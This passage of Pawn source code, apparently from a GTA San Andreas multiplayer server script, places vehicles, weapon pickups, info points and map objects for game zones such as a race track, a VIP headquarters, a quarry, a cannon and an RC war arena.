	CreateVehicleEx(502,714.4020,-1390.4390,13.4547,90.5474,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,729.5116,-1390.4248,13.4669,91.5946,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,741.6196,-1390.2346,13.4713,90.4860,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,753.5009,-1390.1096,13.4698,90.9986,36,88,respawntime,0,world_srace); // newsracev
	CreateVehicleEx(502,758.8358,-1390.2432,13.4621,94.3368,36,88,respawntime,0,world_srace); // newsracev
	// Special Vehicles
	CreateSpecialVehicle(453,2562.5186,504.5322,-0.1887,273.8044,-1,-1,respawntime,world_normal,9958,SV_SUBMARINE,"Submarine",1,1,0.0,0.0,-4.0,0.0,0.0,180.0);
	CreateSpecialVehicle(493,2282.8662,537.3268,-0.0885,176.4441,-1,-1,respawntime,world_normal,1607,SV_DOLPHIN1,"Dolphin #1",1);
	CreateSpecialVehicle(493,2277.5813,537.6550,-0.0904,176.4441,-1,-1,respawntime,world_normal,1607,SV_DOLPHIN2,"Dolphin #2",1);
	CreateSpecialVehicle(460,-1405.3325,1535.9092,1.5115,94.6681,-1,-1,respawntime,world_normal,8493,SV_GHOSTSHIP,"Ghost Ship",1,1,.oy = 5.0);
	CreateSpecialVehicle(563,1584.2795,1435.7751,11.5433,103.7900,1,6,respawntime,world_normal,19277,SV_TRANSHELI,"Transport Heli",0,0,2.0,0.15,0.0,0.0,0.0,90.0);
	AddToSpecialVehicle(lastSpecialVehicle,19277,-2.0,0.15,0.0,0.0,0.0,90.0);
	CreateSpecialVehicle(563,1584.1279,1459.0037,11.5857,66.9439,1,6,respawntime,world_normal,19277,SV_TRANSHELI,"Transport Heli",0,0,2.0,0.15,0.0,0.0,0.0,90.0);
	AddToSpecialVehicle(lastSpecialVehicle,19277,-2.0,0.15,0.0,0.0,0.0,90.0);
	CreateSpecialVehicle(563,1597.3793,1480.9333,11.5224,80.3523,1,6,respawntime,world_normal,19277,SV_TRANSHELI,"Transport Heli",0,0,2.0,0.15,0.0,0.0,0.0,90.0);
	CreateSpecialVehicle(563,1594.0518,1417.9188,11.5369,86.5584,1,6,respawntime,world_normal,19277,SV_TRANSHELI,"Transport Heli",0,0,-2.0,0.15,0.0,0.0,0.0,90.0);
	CreateSpecialVehicle(563,1543.4995,-1353.3311,330.1748,88.9496,-1,-1,respawntime,world_normal,19277,SV_TRANSHELI,"Transport Heli",0,0,2.0,0.15,0.0,0.0,0.0,90.0);
	AddToSpecialVehicle(lastSpecialVehicle,19277,-2.0,0.15,0.0,0.0,0.0,90.0);
	// Special Pickups
	CreatePickupEx(1254,2,-2432.9988,-1619.7832,526.5070,9); // hell
	CreatePickupEx(1248,2,-2316.2725,-1595.8975,483.8617,10); // gta3
	CreatePickupEx(19133,1,301.7777,-77.2763,1001.5156,12,-1); // enter ammunation shooting
	CreatePickupEx(19133,1,301.6478,-75.0611,1001.5156,13,-1); // exit ammunation shooting
	CreatePickupEx(346,1,302.5858,-59.5720,1001.5156,14); // 9mm
	CreatePickupEx(348,1,302.8076,-61.1397,1001.5156,15); // deagle
	CreatePickupEx(349,1,302.7161,-62.6381,1001.5156,16); // shotgun
	CreatePickupEx(350,1,302.7257,-64.2137,1001.5156,17); // sawnoff
	CreatePickupEx(351,1,302.7281,-65.5655,1001.5156,18); // combat
	CreatePickupEx(353,1,302.7820,-67.2841,1001.5156,19); // mp5
	CreatePickupEx(356,1,302.6591,-68.6206,1001.5156,20); // m4
	CreatePickupEx(358,1,302.6789,-70.0830,1001.5156,21); // sniper
	CreatePickupEx(19131,1,-1497.1211,1384.8887,2.2081,22,world_srace); // underwater
	CreatePickupEx(19131,1,-1493.5186,1383.4175,1.9877,23,world_srace); // waterwalk
	CreatePickupEx(19132,1,2042.4910,794.8742,10.8203,29); // reload grass
	CreatePickupEx(19130,1,-329.1052,1860.5182,44.3828,30,worlds_dmz + dmz_shavuot); // ammunation shavuot
	CreatePickupEx(19132,1,-319.6231,1916.4576,64.9192,31,worlds_dmz + dmz_shavuot); // upgrade shavuot
	CreatePickupEx(19132,1,-230.2943,1852.1642,67.1032,31,worlds_dmz + dmz_shavuot); // upgrade shavuot
	// Info Points
	CreateInfoPoint(2078.3113,798.3960,10.8203,0,"рцх° фющ°хЎщэ"); // ip_race
	CreateInfoPoint(1705.2863,1599.3629,10.0939,1,"∙уф ·ЄхЇф"); // ip_ap
	CreateInfoPoint(2294.0669,546.9643,1.7944,2,"Ёюь ёщ°х·"); // ip_ships
	CreateInfoPoint(2359.6511,547.5239,1.7969,2,"Ёюь ёщ°х·"); // ip_ships
	CreateInfoPoint(-1654.3967,1323.4866,7.1827,3,"Ёюь ёщ°х·"); // ip_docks
	CreateInfoPoint(2194.0447,1987.9573,12.2969,4,"сЁў"); // ip_bank
	CreateInfoPoint(285.4030,-1605.6546,114.4512,4,"сЁў",world_bank); // ip_bank
	CreateInfoPoint(2158.7249,946.6951,10.8203,5,"чЁх· фЁ∙ўщэ"); // ip_ammu
	CreateInfoPoint(2000.5524,1538.2231,13.5859,6,"ёЇщЁ· фыёє"); // ip_pirate
	CreateInfoPoint(891.9313,-1101.8378,23.5000,7,"сщ· ўс°х·"); // ip_cemetery
	CreateInfoPoint(836.7144,866.6225,12.9387,8,"рцх° сЁщщф"); // ip_sandkings
	CreateInfoPoint(708.6020,856.7463,-30.1982,11,"ючЎсф"); // ip_quarry
	CreateInfoPoint(634.8951,-1970.9575,1.6259,9,"чЁх· фчщх·"); // ip_petshop
	CreateInfoPoint(2606.6003,-2163.0830,-0.2188,10,"чЁх· фЇЎЎх·"); // ip_bombshop
	// Pet Texts
	CreatePetText(4,626.1953,-1953.7880,-0.1039+0.8); // turtle
	CreatePetText(5,636.9111,-1941.3179,-0.5594+2.5); // dolphin
	CreatePetText(2,636.6704,-1951.7477,-0.6314+0.8); // redjelly
	CreatePetText(1,627.0967,-1927.8685,-0.7095+2.5); // fish
	CreatePetText(9,640.4000,-1934.4043,-0.4527+2.3); // shark
	CreatePetText(6,629.2673,-1971.1158,1.6259+0.8); // parrot
	// Monster Objects
	CreateSObject(1225,-1369.4664,933.2680,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1374.4437,928.5338,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1380.5696,933.4393,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1386.8962,928.7953,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1393.1720,933.0547,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1397.5916,928.4868,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1403.2192,933.1367,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1409.0721,927.6141,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1415.2876,932.8643,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1422.2150,928.1894,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1427.8900,933.1711,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1436.0211,929.2944,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1443.5825,935.1646,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1452.5182,931.5772,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1459.6144,938.9451,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1470.1237,936.8548,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1474.5758,944.6253,1041.5313,0.0,0.0,0.0,object_show_distance,15,world_monster);
	CreateSObject(1225,-1482.5273,943.1183,1041.5239,0.0,0.0,0.0,object_show_distance,15,world_monster);
	// War Objects
	dbg(11,"6.2");
	CreateSObject(971, -1355.5256, 1243.5609, 1039.8671, 0.0, 0.0, 267.2144, object_show_distance, 16, world_war);
	CreateSObject(971, -1355.728, 1251.6347, 1039.8671, 0.0, 0.0, 279.0976, object_show_distance, 16, world_war);
	CreateSObject(971, -1356.4893, 1235.679, 1039.8671, 0.0, 0.0, 257.1875, object_show_distance, 16, world_war);
	CreateSObject(971, -1357.8747, 1259.4935, 1039.8671, 0.0, 0.0, 292.8609, object_show_distance, 16, world_war);
	CreateSObject(971, -1361.8826, 1266.7132, 1039.8671, 0.0, 0.0, 305.7078, object_show_distance, 16, world_war);
	CreateSObject(971, -1359.6292, 1227.4438, 1039.8671, 0.0, 0.0, 245.5941, object_show_distance, 16, world_war);
	CreateSObject(971, -1363.7676, 1220.7299, 1039.8671, 0.0, 0.0, 234.9407, object_show_distance, 16, world_war);
	CreateSObject(971, -1366.7397, 1273.3447, 1039.8671, 0.0, 0.0, 308.2145, object_show_distance, 16, world_war);
	CreateSObject(971, -1368.7513, 1215.2677, 1039.8671, 0.0, 0.0, 222.0941, object_show_distance, 16, world_war);
	CreateSObject(971, -1375.3366, 1210.5208, 1039.8671, 0.0, 0.0, 209.5605, object_show_distance, 16, world_war);
	CreateSObject(971, -1372.6445, 1279.2656, 1039.8671, 0.0, 0.0, 323.8813, object_show_distance, 16, world_war);
	CreateSObject(971, -1382.0044, 1207.2954, 1039.8671, 0.0, 0.0, 196.7138, object_show_distance, 16, world_war);
	CreateSObject(971, -1379.8895, 1283.3664, 1039.8671, 0.0, 0.0, 339.2582, object_show_distance, 16, world_war);
	CreateSObject(971, -1389.3097, 1205.3645, 1039.8671, 0.0, 0.0, 190.1337, object_show_distance, 16, world_war);
	CreateSObject(971, -1397.3012, 1204.6231, 1039.8671, 0.0, 0.0, 178.5403, object_show_distance, 16, world_war);
	CreateSObject(971, -1388.0995, 1285.545, 1039.8671, 0.0, 0.0, 350.2249, object_show_distance, 16, world_war);
	CreateSObject(971, -1405.4029, 1205.5955, 1039.8671, 0.0, 0.0, 166.9469, object_show_distance, 16, world_war);
	CreateSObject(971, -1413.1801, 1208.2651, 1039.8671, 0.0, 0.0, 155.9801, object_show_distance, 16, world_war);
	CreateSObject(971, -1420.6617, 1212.3712, 1039.8671, 0.0, 0.0, 145.0134, object_show_distance, 16, world_war);
	CreateSObject(971, -1404.9794, 1285.6394, 1039.8671, 0.0, 0.0, 7.4818, object_show_distance, 16, world_war);
	CreateSObject(971, -1413.2221, 1283.0635, 1039.8671, 0.0, 0.0, 23.462, object_show_distance, 16, world_war);
	CreateSObject(971, -1426.8216, 1217.8739, 1039.8671, 0.0, 0.0, 132.1666, object_show_distance, 16, world_war);
	CreateSObject(971, -1420.649, 1278.9429, 1039.8671, 0.0, 0.0, 35.0554, object_show_distance, 16, world_war);
	CreateSObject(971, -1431.3439, 1223.7575, 1039.8671, 0.0, 0.0, 123.3933, object_show_distance, 16, world_war);
	CreateSObject(971, -1427.3254, 1273.4919, 1039.8671, 0.0, 0.0, 42.8888, object_show_distance, 16, world_war);
	CreateSObject(971, -1434.8936, 1230.7, 1039.8671, 0.0, 0.0, 113.0766, object_show_distance, 16, world_war);
	CreateSObject(971, -1436.793, 1253.833, 1039.8671, 0.0, 0.0, 76.4162, object_show_distance, 16, world_war);
	CreateSObject(971, -1437.1655, 1238.1148, 1039.8671, 0.0, 0.0, 99.2898, object_show_distance, 16, world_war);
	CreateSObject(971, -1437.8707, 1245.867, 1039.8671, 0.0, 0.0, 88.0097, object_show_distance, 16, world_war);
	CreateSObject(971, -1434.3182, 1262.0488, 1039.8671, 0.0, 0.0, 67.9561, object_show_distance, 16, world_war);
	CreateSObject(971, -1431.3768, 1267.9521, 1039.8671, 0.0, 0.0, 57.2789, object_show_distance, 16, world_war);
	CreateSObject(971, -1396.1901, 1286.1743, 1039.8671, 0.0, 0.0, 1.5051, object_show_distance, 16, world_war);
	// VIP HQ
	CreateSObject(8620, -2706.34058, 303.17337, 26.21536,   0.00000, 0.00000, 0.00000);
	CreateSObject(8620, -2706.29150, 451.67419, 26.21536,   0.00000, 0.00000, 0.00000);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 230.87000);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 297.14941);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 316.69443);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 212.18666);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 292.69418);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 274.35062);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 19.20000);
	CreateSObject(3472, -2706.29077, 375.64517, 3.96305,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2699.58813, 316.68353, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2713.27856, 316.51099, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2699.54346, 308.44846, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2713.22900, 308.23523, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2699.69653, 312.53836, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -2713.38696, 312.36581, 2.48290,   0.00000, 0.00000, 0.00000);
	CreateSObject(19335, -2697.03491, 328.74893, 3.35279,   0.00000, 0.00000, 0.00000);
	CreateSObject(19335, -2715.27368, 328.71939, 3.35279,   0.00000, 0.00000, 0.00000);
	CreateSObject(8493, -2666.07642, 377.41956, 44.37266,   26.04000, 3.47999, -271.38000);
	CreateSObject(8493, -2743.53955, 376.41956, 44.37266,   26.04000, 3.47999, -450.47968);
	CreateSObject(8397, -2674.23633, 376.91064, -29.93801,   0.00000, 0.00000, 0.00000);
	CreateSObject(8397, -2705.07788, 347.97354, -29.93801,   0.00000, 0.00000, 0.00000);
	CreateSObject(8397, -2737.78467, 376.20236, -32.52509,   0.00000, 0.00000, 0.00000);
	CreateSObject(8397, -2706.64209, 403.52478, -29.93801,   0.00000, 0.00000, 0.00000);
	CreateSObject(3267, -2685.14429, 354.73624, 3.63596,   0.00000, 0.00000, 65.87999);
	CreateSObject(3277, -2685.48169, 354.69022, 3.70604,   0.00000, 0.00000, 0.00000);
	CreateSObject(8210, -2658.82861, 415.58163, 6.02051,   0.00000, 0.00000, -50.94001);
	CreateSObject(8210, -2765.73926, 426.03311, 6.13317,   0.00000, 0.00000, 0.00000);
	CreateSObject(8210, -2658.21094, 335.38010, 6.16174,   0.00000, 0.00000, -135.05989);
	CreateSObject(8210, -2751.59937, 324.63290, 5.65939,   0.00000, 0.00000, 0.00000);
	//CreateSObject(18018, -2756.17847, 410.97455, -10.48227,   0.00000, 0.00000, 269.55542);
	//CreateSObject(19129, -2757.06958, 405.12369, -10.51509,   0.00000, 0.00000, 359.42197);
	//CreateSObject(18102, -2753.47070, 400.71094, -4.35399,   0.00000, 0.00000, 0.00000);
	//CreateSObject(18102, -2765.87183, 399.95941, -4.51678,   0.00000, 0.00000, -130.43994);
	//CreateSObject(1826, -2765.46387, 405.52313, -9.10415,   0.00000, 0.00000, -90.41999);
	//CreateSObject(14820, -2765.51611, 405.00632, -8.20357,   0.00000, 0.00000, -90.59998);
	CreateVehicleEx(409, -2763.1060, 358.9857, 3.9735, -90.3600, -1, -1);
	CreateVehicleEx(409, -2763.0269, 392.0671, 3.9735, -90.3600, -1, -1);
	CreatePickupEx(1240, 1, -2707.8159,372.1333,4.9745);
	CreatePickupEx(1242, 1, -2704.4424,372.0930,4.9689);
	// CB
	CreateVehicleEx(424,-2407.0137,-2176.5969,33.0703,268.0386,0,0); // ct
	CreateVehicleEx(424,-2407.2896,-2180.3240,33.0696,264.4583,0,0); // ct
	CreateVehicleEx(424,-2407.7195,-2183.7532,33.0704,268.1863,0,0); // ct
	CreateVehicleEx(495,-2395.6294,-2214.3037,33.6346,328.6396,0,0); // ct
	CreateVehicleEx(495,-2400.3047,-2209.4712,33.6384,300.5271,0,0); // ct
	CreateVehicleEx(495,-2395.8149,-2198.4153,33.6341,242.8558,0,0); // ct
	CreateVehicleEx(568,-2396.1792,-2167.6360,33.1506,173.5278,0,0); // ct
	CreateVehicleEx(568,-2393.0498,-2167.9460,33.1447,171.4112,0,0); // ct
	CreateVehicleEx(568,-2389.8208,-2168.7620,33.1558,169.0805,0,0); // ct
	CreateVehicleEx(468,-2410.2932,-2172.0994,32.9581,352.7807,0,0); // ct
	CreateVehicleEx(468,-2412.3123,-2172.3425,32.9644,355.3427,0,0); // 1
	CreateVehicleEx(468,-2414.8750,-2172.3938,32.9581,359.4723,0,0); // 1
	// Bumper
	CreateSObject(7418, 1347.908447, 2149.583008, 12.634029, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1376.611450, 2196.285645, 27.438925, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1393.831909, 2175.811523, 27.438925, 0.0000, 0.0000, 285.2290);
	CreateSObject(1278, 1327.081543, 2196.454346, 24.212912, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1395.050171, 2131.330811, 24.212912, 0.0000, 0.0000, 289.5262);
	// Quarry
	CreateSObject(18609, 682.738342, 849.818787, -39.588436, 12.0321, 0.0000, 62.7389);
	CreateSObject(18367, 674.604065, 863.569336, -49.148396, 331.6386, 0.0000, 73.0521);
	CreateSObject(16367, 474.112793, 880.308838, -29.089787, 0.0000, 0.0000, 0.0000);
	CreateSObject(13640, 631.768860, 811.291443, -42.940666, 0.0000, 0.0000, 351.4056);
	CreateSObject(16644, 801.475098, 857.165161, 14.904968, 1.7189, 341.9518, 295.5422);
	CreateSObject(1225, 760.200134, 847.976929, -8.016648, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 751.139282, 801.442017, -8.007792, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 737.559753, 936.752502, -8.007819, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 687.997620, 969.180359, -13.378689, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 624.151855, 907.464294, -44.830032, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 658.532898, 886.188110, -41.549664, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 658.366455, 901.995667, -41.400940, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 607.170471, 868.339050, -40.808361, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 639.347778, 857.219543, -40.819794, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 637.682678, 826.354614, -40.793236, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 641.199829, 843.894226, -34.396271, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 602.946960, 830.072998, -30.922886, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 575.265381, 872.115479, -36.673599, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 551.353455, 878.608276, -37.606537, 0.0000, 0.0000, 0.0000);
	CreateSObject(4638, 833.261169, 865.533936, 13.216340, 0.0000, 0.0000, 286.9479);
	CreateSObject(11326, 855.589478, 880.404114, 14.671446, 0.0000, 0.0000, 204.4420);
	// Tower
	CreateSObject(16644, 1524.228149, -1376.866699, 328.858215, 0.0000, 0.0000, 46.7189);
	CreateSObject(16644, 1515.174438, -1359.827637, 328.736053, 0.0000, 0.8594, 8.0443);
	CreateSObject(16644, 1518.650269, -1341.292236, 328.794891, 0.0000, 0.0000, 329.0603);
	CreateSObject(16644, 1534.668823, -1329.327515, 328.778595, 0.0000, 0.0000, 289.5262);
	CreateSObject(16644, 1555.904419, -1330.263184, 328.703522, 0.0000, 0.0000, 244.8355);
	CreateSObject(16644, 1571.246582, -1342.922729, 328.705597, 0.0000, 0.0000, 205.3015);
	CreateSObject(16644, 1573.886108, -1360.859131, 328.680206, 0.0000, 0.0000, 170.9240);
	CreateSObject(16644, 1563.598267, -1377.271729, 328.780182, 0.0000, 0.0000, 130.5305);
	CreateSObject(16644, 1543.770142, -1383.516724, 328.711853, 0.0000, 0.0000, 87.5587);
	CreateSObject(3666, 1507.668091, -1360.069580, 329.390411, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1508.023071, -1362.395874, 329.391602, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1512.673462, -1336.819580, 329.317383, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1511.532593, -1338.774292, 329.343170, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1533.032471, -1322.070923, 329.303986, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1530.753296, -1322.866211, 329.300507, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1557.715332, -1322.924561, 329.239166, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1559.763428, -1323.926758, 329.221436, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1577.324829, -1338.413818, 329.240356, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1578.285522, -1340.517334, 329.227081, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1581.421753, -1360.548096, 329.190216, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1581.102661, -1362.868530, 329.204193, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1569.562012, -1381.973633, 329.302734, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1567.818970, -1383.452148, 329.339203, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1544.967285, -1390.956421, 329.247711, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1542.644897, -1390.850708, 329.235596, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1520.167969, -1383.319580, 329.422882, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1518.539063, -1381.685791, 329.382385, 0.0000, 0.0000, 22.5000);
	// Cannon
	cannonObjects[0] = CreateSObject(3502, -547.270142, 2593.982910, 53.819229, 0.0000, 0.0000, 269.7591);
	cannonObjects[1] = CreateSObject(2780, -547.034119, 2593.882324, 48.858860, 0.0000, 0.0000, 0.0000);
	cannonObjects[2] = CreateSObject(3749, -540.559875, 2594.434326, 58.273838, 0.0000, 0.0000, 269.7591);
	cannonObjects[3] = CreateSObject(17324, -550.988953, 2594.201172, 52.411087, 0.0000, 0.0000, 91.1003);
	cannonObjects[4] = CreateSObject(5811, -543.086060, 2589.847412, 50.941620, 0.0000, 0.0000, 268.0403);
	cannonObjects[5] = CreateSObject(5811, -542.930115, 2598.003418, 50.966576, 0.0000, 0.0000, 268.0403);
	cannonObjects[6] = CreateSObject(5811, -543.355408, 2599.220459, 58.109230, 0.0000, 270.6186, 87.6625);
	cannonObjects[7] = CreateSObject(2780, -549.165588, 2590.478760, 52.934780, 0.0000, 0.0000, 0.0000);
	cannonObjects[8] = CreateSObject(2780, -548.456116, 2598.136475, 52.733784, 0.0000, 0.0000, 0.0000);
	cannonObjects[9] = CreateSObject(2780, -560.507813, 2592.180176, 54.717590, 0.0000, 0.0000, 0.0000);
	cannonObjects[10] = CreateSObject(2780, -553.260742, 2593.731445, 52.934780, 0.0000, 0.0000, 0.0000);
	cannonObjects[11] = CreateSObject(2780, -553.619019, 2592.513672, 52.934780, 0.0000, 0.0000, 0.0000);
	cannonObjects[12] = CreateSObject(2780, -553.460754, 2593.193359, 53.057842, 0.0000, 0.0000, 0.0000);
	cannonObjects[13] = CreateSObject(18256, -496.999207, 2587.837891, 48.536819, 358.2811, 338.5141, 4.2972);
	for(new i = 0; i < 10; i++) cannonVehicles[i] = CreateVehicleEx(590,-545.7040,2594.0491,54.4306,177.9398,0,0);
	CreateVehicleEx(411,-508.2006,2637.6880,53.1411,90.4616,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2630.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2623.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2616.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2609.6191,53.1411,91.5440,123,1); // cannonvinf
	// FirePlace
	fpinfo[fpStart] = CreateSObject(971, -684.489990, 2359.088379, 162.174698, 0.0000, 3.4377, 289.9217);
	CreateSObject(971, -681.490662, 2350.940918, 161.646271, 0.0000, 3.4377, 290.7811);
	CreateSObject(971, -678.387146, 2342.709717, 161.154785, 0.0000, 2.5783, 290.7811);
	CreateSObject(971, -676.806091, 2338.532959, 160.967682, 0.0000, 2.5783, 289.9217);
	CreateSObject(971, -670.972839, 2335.161621, 160.679352, 0.0000, 0.8594, 9.5312);
	CreateSObject(971, -662.375061, 2336.495117, 160.479599, 0.0000, 1.7189, 7.8122);
	CreateSObject(971, -653.602783, 2337.790039, 160.211243, 0.0000, 1.7189, 8.6717);
	CreateSObject(971, -644.851196, 2339.099365, 159.921997, 0.0000, 1.7189, 8.6717);
	CreateSObject(971, -640.501526, 2339.742188, 159.729889, 0.0000, 1.7189, 7.8122);
	CreateSObject(971, -635.003540, 2344.388428, 159.769211, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -632.521423, 2352.856934, 160.135712, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -629.998291, 2361.304199, 160.502441, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -629.081116, 2364.423340, 160.634369, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -628.304260, 2373.043945, 161.049713, 0.0000, 2.5783, 276.0934);
	CreateSObject(971, -629.188599, 2381.792236, 161.414948, 0.0000, 2.5783, 276.0934);
	CreateSObject(971, -629.783447, 2385.314209, 161.620117, 0.0000, 2.5783, 278.6717);
	CreateSObject(971, -633.489502, 2392.789795, 161.996292, 0.0000, 2.5783, 314.1406);
	CreateSObject(971, -639.524292, 2399.071045, 162.055511, 0.0000, 359.1406, 314.1406);
	CreateSObject(971, -643.586060, 2403.355713, 161.872055, 0.0000, 358.2811, 314.1406);
	CreateSObject(971, -684.802185, 2367.390137, 162.640671, 0.0000, 3.4377, 254.4529);
	CreateSObject(971, -682.326538, 2375.885254, 163.172607, 0.0000, 3.4377, 252.7340);
	CreateSObject(971, -680.473694, 2382.010010, 163.550446, 0.0000, 3.4377, 254.4529);
	CreateSObject(971, -676.205078, 2389.167969, 164.029495, 0.0000, 3.4377, 222.3445);
	CreateSObject(971, -669.737122, 2394.492188, 163.967239, 0.0000, 356.5623, 217.1106);
	CreateSObject(971, -662.468811, 2399.217773, 163.271378, 0.0000, 354.8434, 209.3756);
	CreateSObject(971, -654.705200, 2402.972168, 162.520477, 0.0000, 354.8434, 202.5000);
	CreateSObject(971, -650.350403, 2404.936768, 162.009796, 0.0000, 354.8434, 205.0784);
	fpinfo[fpEnd] = CreateSObject(971, -672.007568, 2392.880371, 157.070908, 0.0000, 359.1406, 220.6256);
	fpinfo[fpUpdate] = fpinfo[fpStart];
	// RC War
	CreateVehicleEx(464,-973.4568,1060.9358,1344.9771,92.1607,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-1031.5508,1020.6958,1341.9498,4.9858,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-1024.7292,1098.2567,1341.8744,174.2876,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-1132.1190,1028.5123,1345.0278,275.1650,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-975.8049,1089.8531,1344.2683,87.3327,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-988.3293,1094.9962,1342.2701,181.2768,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(464,-1078.4672,1054.5433,1342.6217,203.5840,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_miniplane
	CreateVehicleEx(501,-1131.6726,1041.7955,1345.1930,269.2417,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_rcheli
	CreateVehicleEx(501,-973.6234,1077.1642,1344.4451,88.7654,14,75,respawntime,10,worlds_dmz + dmz_rcwar); // dmz_rcheli
	CreatePickupEx(356,2,-1087.0205,1047.3381,1347.1007,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1062.6301,1045.0300,1347.6165,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1062.7502,1060.6566,1347.1085,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1042.2548,1052.1958,1345.5155,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1043.2925,1099.1595,1345.2643,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1042.5052,1082.4576,1346.8914,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1042.0688,1068.3406,1346.5833,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	CreatePickupEx(356,2,-1024.1956,1075.7186,1346.9476,0,worlds_dmz + dmz_rcwar); // newdmz_m4
	// GunGame
	CreateSObject(8391, -27.288683, 1768.578247, 38.546013, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
